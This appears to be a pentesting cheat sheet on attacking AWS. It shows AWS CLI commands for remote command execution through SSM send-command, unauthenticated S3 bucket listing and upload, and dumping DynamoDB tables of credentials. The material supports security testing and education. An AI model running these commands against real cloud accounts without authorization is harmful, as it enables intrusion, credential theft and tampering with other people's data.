---
title: Hacking AWS
category: Other
order: 1
---

Amazon Web Services is a subsidiary of Amazon providing on-demand cloud computing platforms and APIs.

# AWSCLI Configuration

You can get your credential here [https://console.aws.amazon.com/iam/home?#/security\_credential](https://console.aws.amazon.com/iam/home?#/security\_credential) but you need an aws account, free tier account : [https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free\_np/](https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free\_np/)

```
aws configure --profile <PROFILE_NAME>
AWSAccessKeyId= <AccessKeyID>
AWSSecretKey= <SecretKey>
Default Region Name= <Region>
Default Output Format = <json or text>
```

Or you can configure the default one stored in `~/.aws/credentials`:

```
aws configure
```

# EC2 

Amazon Elastic Compute Cloud (Amazon EC2) provides secure and resizable computing capacity in the AWS cloud. Using Amazon  EC2  eliminates  the need  to invest in hardware up front, so you can develop and deploy applications faster. To resume an EC2 is a virtual machine. SSH keys are created when started to connect to linux devices, for windows it uses RDP. Exists security groups to handle open ports and allowed IPs.

# STS

AWS Security Token Service (STS) enables you to request temporary, limited-privileges credentials for AWS IAM users or for users that you authenticate.

## Identify the token

```
$ aws sts get-caller-identity
{
    "UserId": "AROAxxxxxxxxxxxxxxxxx:i-xxxxxxxxxxxxxxxxx",
    "Account": "19xxxxxxxxxx",
    "Arn": "arn:aws:sts::19xxxxxxxxxx:assumed-role/webserver/i-xxxxxxxxxxxxxxxxx"
}
```

# SSM

AWS System Manager is a collection of capabilities that helps you automate management tasks such as collecting system inverntory, applying OS patches, automating the creation of AMIs. Systems Manager lets you remotely and securely manage the configuration of your managed instances.

A managed instance is any EC2 instance or any on-premise server or VM.

## Check instances are accepted for executing commands

```
$ aws ssm describe-instance-information --output text --query "InstanceInformationList[*]"
1.2.3.4       example-1234567890.eu-west-1.elb.amazonaws.com 172.10.1.100    i-xxxxxxxxxxxxxxxxx     False   2021-02-05T13:37:00.000000+01:00        Online  Amazon Linux AMI        Linux   2020.01 EC2Instance
```

## Send Command

Copy the `CommandId` of the output for later usage.

```
$ aws ssm send-command --document-name "AWS-RunShellScript" --comment "RCE test: whoami" --targets "Key=instanceids,Values=[instanceid]" --parameters 'commands=whoami'
{
    "Command": {
        "CommandId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
        "DocumentName": "AWS-RunShellScript",
        "DocumentVersion": "",
        "Comment": "RCE test: whoami",
        "ExpiresAfter": "2021-02-05T13:37:00.000000+01:00",
        "Parameters": {
            "commands": [
                "whoami"
            ]
        },
        "InstanceIds": [],
        "Targets": [
            {
                "Key": "instanceids",
                "Values": [
                    "i-xxxxxxxxxxxxxxxxx"
                ]
            }
        ],
        "RequestedDateTime": "2021-02-05T13:37:00.000000+01:00",
        "Status": "Pending",
        "StatusDetails": "Pending",
        "OutputS3BucketName": "",
        "OutputS3KeyPrefix": "",
        "MaxConcurrency": "50",
        "MaxErrors": "0",
        "TargetCount": 0,
        "CompletedCount": 0,
        "ErrorCount": 0,
        "DeliveryTimedOutCount": 0,
        "ServiceRole": "",
        "NotificationConfig": {
            "NotificationArn": "",
            "NotificationEvents": [],
            "NotificationType": ""
        },
        "CloudWatchOutputConfig": {
            "CloudWatchLogGroupName": "",
            "CloudWatchOutputEnabled": false
        },
        "TimeoutSeconds": 3600
    }
}
```
## Check command output

With the previous `CommandId` check the output. If the command didn't finish yet, the `Status` will be shown as `pending`.

```
$ aws ssm list-command-invocations --command-id "[CommandId]" --details
{
    "CommandInvocations": [
        {
            "CommandId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
            "InstanceId": "i-xxxxxxxxxxxxxxxxx",
            "InstanceName": "",
            "Comment": "RCE test: whoami",
            "DocumentName": "AWS-RunShellScript",
            "DocumentVersion": "",
            "RequestedDateTime": "2021-02-05T13:37:00.000000+01:00",
            "Status": "Success",
            "StatusDetails": "Success",
            "StandardOutputUrl": "",
            "StandardErrorUrl": "",
            "CommandPlugins": [
                {
                    "Name": "aws:runShellScript",
                    "Status": "Success",
                    "StatusDetails": "Success",
                    "ResponseCode": 0,
                    "ResponseStartDateTime": "2021-02-05T13:37:00.000000+01:00",
                    "ResponseFinishDateTime": "2021-02-05T13:37:00.000000+01:00",
                    "Output": "root\n",
                    "StandardOutputUrl": "",
                    "StandardErrorUrl": "",
                    "OutputS3Region": "eu-west-1",
                    "OutputS3BucketName": "",
                    "OutputS3KeyPrefix": ""
                }
            ],
            "ServiceRole": "",
            "NotificationConfig": {
                "NotificationArn": "",
                "NotificationEvents": [],
                "NotificationType": ""
            },
            "CloudWatchOutputConfig": {
                "CloudWatchLogGroupName": "",
                "CloudWatchOutputEnabled": false
            }
        }
    ]
}
```
When the command is succcessfully executed the output is shown in:

```
CommandInvocations.CommandPlugins.Output
```

# S3 Buckets

*Amazon Simple Storage Service* as known as **S3 Bucket** has a simple web services interface that you can use to store and retrieve any amount of data, at any time, from anywhere on the web.


## Search for S3 Buckets

We need to identify if the service running is a s3.

```
http://s3.amazonaws.com/[bucket_name]/
http://[bucket_name].s3.amazonaws.com/
```

You can get the region of a bucket with a dig and nslookup:

```
$ dig flaws.cloud
;; ANSWER SECTION:
flaws.cloud.    5    IN    A    52.218.192.11

$ nslookup 52.218.192.11
Non-authoritative answer:
11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com.
```

## Enumeration

We will use `aws-cli` tool

* Use `--no-sign-request` for check Everyones permissions
* Use `--profile <PROFILE_NAME>` to indicate the previous configuration profile.

### Search Buckets inside the same host:

```
aws s3 ls --endpoint-url http://s3.DOMAIN.COM/ --no-sign-request
```

### List content of a bucket:

```
aws s3 ls s3://BUCKET-NAME --endpoint-url http://s3.DOMAIN.COM/ --no-sign-request
```

### Copy content:

```
aws s3 cp /tmp/FILE s3://BUCKET-NAME --endpoint-url http://s3.DOMAIN.COM/ --no-sign-request
```

# DynamoDB

Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications.

## List tables

```
aws dynamodb list-tables --endpoint-url http://s3.DOMAIN.COM/
{
    "TableNames": [
        "TABLENAME"
    ]
}
```

## Get Table Content

```
aws dynamodb scan --table-name TABLENAME --endpoint-url http://s3.DOMAIN.COM/
{
    "Items": [
        {
            "password": {
                "S": "PWD@#1@#"
            },
            "username": {
                "S": "USER3"
            }
        },
        {
            "password": {
                "S": "PWD!"
            },
            "username": {
                "S": "USER2"
            }
        },
        {
            "password": {
                "S": "PWD"
            },
            "username": {
                "S": "USER1"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

## Create Table

```
aws dynamodb create-table --table-name TABLENAME--attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --endpoint-url http://s3.DOMAIN.COM/
```

## Create Item

```
aws dynamodb update-item --table-name TABLENAME--key file://FILE.json --endpoint-url http://s3.DOMAIN.COM/

# where FILE.json is:

{
    "title": {"S": "TITLECONTENT"},
    "data": {"S": "DATACONTENT"}
}
```
# References

* [https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3](https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3)
* [https://docs.aws.amazon.com/cli/latest/reference/dynamodb/index.html](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/index.html)
* [https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40](https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40)
* [https://github.com/six2dez/pentest-book/blob/dd75c8af72e4906593c744a3aacc4888d7c04430/enumeration/cloud/aws.md#basic-commands-1](https://github.com/six2dez/pentest-book/blob/dd75c8af72e4906593c744a3aacc4888d7c04430/enumeration/cloud/aws.md#basic-commands-1)